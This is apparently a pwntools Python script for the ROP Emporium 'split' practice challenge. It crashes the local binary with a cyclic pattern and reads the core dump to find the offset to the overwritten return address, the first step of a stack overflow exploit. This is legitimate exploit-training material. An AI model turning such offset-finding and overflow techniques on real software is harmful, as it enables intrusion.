from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge2/x64/split'

bin= ELF(bin)
context.binary = bin
context.log_level = 'info'

p= process(bin.path)
p.sendline(cyclic(400, n=8))
p.wait_for_close()
core= p.corefile

leak= core.read(core.rsp, 8)   #read from stack where ret crashed instead of reading eip/rip
offset= cyclic_find(leak, n=8)
print(f"Found offset {offset}")